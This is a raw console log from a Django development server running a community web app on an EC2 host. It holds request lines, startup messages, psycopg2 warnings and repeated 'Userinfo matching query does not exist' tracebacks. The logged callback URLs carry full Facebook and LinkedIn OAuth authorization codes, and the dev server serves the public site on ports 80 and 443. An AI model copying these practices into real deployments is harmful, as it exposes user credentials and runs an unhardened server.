Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 15:01:36] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 15:01:47] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 15:01:47] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 15:02:38] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 15:02:39] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 15:02:49] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 15:02:49] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
[16/Dec/2018 15:03:42] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 15:03:43] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 15:04:02] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
Validating models...

System check identified no issues (0 silenced).
December 16, 2018 - 14:45:30
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Performing system checks...

System check identified no issues (0 silenced).
December 16, 2018 - 13:51:25
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 18:31:00] "GET / HTTP/1.1" 200 14821
[16/Dec/2018 18:32:55] "GET / HTTP/1.1" 200 14821
[16/Dec/2018 18:32:56] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:32:58] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:32:58] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:33:02] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:33:09] "GET / HTTP/1.1" 200 14821
[16/Dec/2018 18:33:10] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:33:13] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:33:15] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:33:16] "GET /media/media/2.png HTTP/1.1" 200 218829
Not Found: /logo.jpeg
[16/Dec/2018 18:33:19] "GET /logo.jpeg HTTP/1.1" 404 5987
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 18:33:40] "GET / HTTP/1.1" 200 14821
[16/Dec/2018 18:33:47] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:33:48] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:33:52] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:33:55] "GET /media/media/logo.png HTTP/1.1" 200 11255
Not Found: /logo.jpeg
[16/Dec/2018 18:34:23] "GET /logo.jpeg HTTP/1.1" 404 5988
[16/Dec/2018 18:34:54] "GET / HTTP/1.1" 200 14821
[16/Dec/2018 18:34:59] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:35:01] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:35:04] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:35:07] "GET /media/media/3.png HTTP/1.1" 200 62062
Performing system checks...

System check identified no issues (0 silenced).
December 16, 2018 - 18:30:28
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Validating models...

System check identified no issues (0 silenced).
December 16, 2018 - 18:30:09
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 18:36:30] "GET / HTTP/1.1" 301 0
Performing system checks...

System check identified no issues (0 silenced).
December 16, 2018 - 18:36:26
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Validating models...

System check identified no issues (0 silenced).
December 16, 2018 - 18:36:21
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 18:37:44] "GET / HTTP/1.1" 301 0
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 18:37:55] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:37:58] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:38:02] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:38:08] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:38:09] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:38:09] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:38:10] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:38:12] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:38:13] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:38:15] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:38:28] "GET /creategroup HTTP/1.1" 301 0
[16/Dec/2018 18:38:28] "GET /creategroup/ HTTP/1.1" 302 0
[16/Dec/2018 18:38:30] "GET /accounts/login/?next=/creategroup/ HTTP/1.1" 200 2762
[16/Dec/2018 18:38:31] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:38:36] "GET / HTTP/1.1" 200 15735
Not Found: /accounts/login/logo.jpeg
[16/Dec/2018 18:38:37] "GET /accounts/login/logo.jpeg HTTP/1.1" 404 6033
Not Found: /accounts/media/media/favicon.ico
[16/Dec/2018 18:38:41] "GET /accounts/media/media/favicon.ico HTTP/1.1" 404 6057
[16/Dec/2018 18:38:41] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:38:48] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:38:53] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:38:53] "GET /media/media/3.png HTTP/1.1" 200 62062
Not Found: /logo.jpeg
[16/Dec/2018 18:39:13] "GET /logo.jpeg HTTP/1.1" 404 5988
[16/Dec/2018 18:40:02] "GET /creategroup HTTP/1.1" 301 0
[16/Dec/2018 18:40:04] "GET /creategroup/ HTTP/1.1" 302 0
[16/Dec/2018 18:40:06] "GET /accounts/login/?next=/creategroup/ HTTP/1.1" 200 2762
[16/Dec/2018 18:40:10] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:40:12] "GET / HTTP/1.1" 200 15735
Not Found: /accounts/login/logo.jpeg
[16/Dec/2018 18:40:13] "GET /accounts/login/logo.jpeg HTTP/1.1" 404 6033
[16/Dec/2018 18:40:17] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:40:22] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:40:30] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:40:31] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:41:05] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:41:09] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:41:12] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:41:13] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:41:17] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:42:40] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:42:45] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:42:52] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:42:57] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:42:57] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:44:03] "GET / HTTP/1.1" 301 0
[16/Dec/2018 18:44:15] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:44:17] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:44:24] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:44:25] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[16/Dec/2018 18:44:27] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[16/Dec/2018 18:44:50] "GET /logo.jpeg HTTP/1.1" 404 5952
[16/Dec/2018 18:45:19] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 18:45:29] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:45:32] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:45:35] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:45:36] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[16/Dec/2018 18:45:39] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[16/Dec/2018 18:45:44] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:45:45] "GET /media/media/2.png HTTP/1.1" 200 81920
[16/Dec/2018 18:45:53] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:45:53] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:46:00] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:46:00] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:46:01] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[16/Dec/2018 18:46:03] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[16/Dec/2018 18:46:04] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:46:59] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:49:13] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:49:14] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:49:18] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:49:27] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:49:27] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:49:28] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:49:29] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:49:30] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:49:32] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:49:32] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:49:32] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 18:49:32] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[16/Dec/2018 18:49:34] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[16/Dec/2018 18:50:09] "GET / HTTP/1.1" 200 15735
[16/Dec/2018 18:50:57] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQAPMgjFLHxLMHXV7bOooVhXisbf66K5PbqMdV4Axxr3r73z8IpTAJzKO_gyoCnbJUMTxBUxOFy7S7HU1L7Capx78X9hx6vDQ08UenHlcRu44uI9DCbByoopHJsuj9Z7fNLWKwP8odqKgiIx0SbAmPLd5S1WrlopdG9nUfUtrQwimIA6RRbNHTYhGKz3F0ZYMWJlMy1VJl4JkBWJsK8iuXVuh9yclUVXgn2x9maKeMoixdDi4sODbWzP_jk9jIr6cZQUB18tvPev6twNy1FWOIqhhgnoNp8gAY-f6Bb9f992TkYPpXtEPmkKiuKiISkhq22FFHPsHje64Th5ePgF-O3mynJWk8wlhiYZbS7fTU8acQ&state=jlKcFc6fzQjCX6LwByAcghgIJSWC00GF HTTP/1.1" 302 0
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 32, in dashboard
    usr = Userinfo.objects.get(user_id = request.user)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
    return getattr(self.get_queryset(), name)(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 399, in get
    self.model._meta.object_name
togther.models.Userinfo.DoesNotExist: Userinfo matching query does not exist.
[16/Dec/2018 18:50:59] "GET / HTTP/1.1" 500 75867
Not Found: /favicon.ico
[16/Dec/2018 18:51:02] "GET /favicon.ico HTTP/1.1" 404 5965
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 32, in dashboard
    usr = Userinfo.objects.get(user_id = request.user)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
    return getattr(self.get_queryset(), name)(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 399, in get
    self.model._meta.object_name
togther.models.Userinfo.DoesNotExist: Userinfo matching query does not exist.
[16/Dec/2018 18:51:45] "GET / HTTP/1.1" 500 75702
[16/Dec/2018 18:52:15] "GET /logout HTTP/1.1" 302 0
[16/Dec/2018 18:52:15] "GET /login/ HTTP/1.1" 200 2762
[16/Dec/2018 18:52:16] "GET /media/media/logo.png HTTP/1.1" 200 11255
Not Found: /login/logo.jpeg
[16/Dec/2018 18:52:18] "GET /login/logo.jpeg HTTP/1.1" 404 5977
[16/Dec/2018 18:52:19] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[16/Dec/2018 18:52:24] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[16/Dec/2018 18:53:15] "GET /oauth/complete/linkedin-oauth2/?code=AQR1iqL-GdfQGPwixBPsL8glEuSM0jT52D8mciZcuVpVEhQedrBu3znA04QFfRi98o4FG9wv2-TOSBhvoF0MObKuWPC2TDC-zI2TYc-rCxgff_7ST_2x9QUGu1jYJ8BeheQBxkaniLASox1ZNNUiR35UkWtvioB0QT00P71YQo5_mCoFzwtb2PSXcxmuXA&state=6bxzANcHBm2K5H4CTfJdTvfI9ZmsUJK3 HTTP/1.1" 302 0
[16/Dec/2018 18:53:16] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 18:53:18] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:53:26] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:53:27] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 18:53:30] "GET /media/media/2.png HTTP/1.1" 200 81920
[16/Dec/2018 18:53:31] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 18:53:39] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 18:53:49] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 18:53:50] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[16/Dec/2018 18:53:51] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 18:53:56] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[16/Dec/2018 18:55:44] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 18:55:56] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQAlfZ6c5sBOYiCwDxlNFB9l2tZLppB8XcoeVmUovVhlrs318gaWj4Sy_OaMEjx97sKMT445L5Ex-Lz364QUsVxFNhCB2EZvl2wsQmCkY7FKnuclb6V4MgcKUqRdpEf_CLo621eMDQkZ3xwZT9Uh3HRg57_JaUgavsx7kLnp4DE4uuBeV7KLS-FI9ItbQ40brAs7E-MLCLyzU7OYRSBzuxpStb3qLYcSQI4tkCnMMbimujw7TvkVPwEbvxjdZkUW2p5jn_ZRSjMaerI6Rr-tkrEIbPd_SKpKKqmS2alnTnOKQwFn1EHcd9LOTNOFLWhBp1KsUXzrARxxAnnKU8Q1MHW8VS9fmnRpWtZtm7-BpJyw3Q&state=2f1kJd5BpaHbRk2aHPlIPFImJRLOE8sn HTTP/1.1" 302 0
[16/Dec/2018 18:55:57] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 18:56:23] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 18:56:27] "GET /profile/9 HTTP/1.1" 200 22687
[16/Dec/2018 19:02:37] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 19:02:38] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 19:02:39] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 19:02:47] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 19:02:51] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 19:02:52] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 19:02:52] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[16/Dec/2018 19:02:55] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Performing system checks...

System check identified no issues (0 silenced).
December 16, 2018 - 18:37:28
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Performing system checks...

System check identified no issues (0 silenced).
December 16, 2018 - 19:10:28
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Validating models...

System check identified no issues (0 silenced).
December 16, 2018 - 18:37:00
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: []
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)

















/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 19:14:21] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 19:14:22] "GET /media/media/1.png HTTP/1.1" 304 0
[16/Dec/2018 19:14:22] "GET /media/media/2.png HTTP/1.1" 304 0
[16/Dec/2018 19:14:22] "GET /media/media/3.png HTTP/1.1" 304 0
[16/Dec/2018 19:14:32] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 19:14:47] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 19:15:07] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 19:15:12] "GET /logout HTTP/1.1" 302 0
[16/Dec/2018 19:15:12] "GET /login/ HTTP/1.1" 200 2762
[16/Dec/2018 19:15:14] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[16/Dec/2018 19:15:16] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 19:15:18] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQBcvsGcYNwJPwTZ7eBpJvhmhxZNa_7ZIPFRMMHA-VBebxAmMI1mdfDlAinMWj4yC3ZcdldXXmMxhgGxy_gDHcjCeDVkiJOeBDR3JHHZHQenIA5LkFupY3A5RM0W9Hndv50prASZUXMcAfS0BWfAsFk2UJhZ1luljQRRHn9q7fxsSmQhRGMU4_FcJKkU30lzJfXvft3ev38d6NGvKqqybZOu2f7fXYuI9h5pm5xjOm8lNH63Z4yi-wQwfdK66_i1IMxZTgkByX44eq3YTyYOtw-FOnXbEirBLZDNTXJs2uT17QwiwYw4vqBExVU3z2MiK9Cx3-stu-_fzwC4RPtrxu6XMjdTbkaoIghkJbu2KoL6lQ&state=1nNJoUcqpTpD2D4MDXDsehTRtagGsWle HTTP/1.1" 302 0
[16/Dec/2018 19:15:20] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 19:15:46] "GET /profile/9 HTTP/1.1" 200 22687
[16/Dec/2018 19:15:49] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 19:18:44] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 19:18:55] "GET / HTTP/1.1" 200 16359
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 32, in dashboard
    usr = Userinfo.objects.get(user_id = request.user)
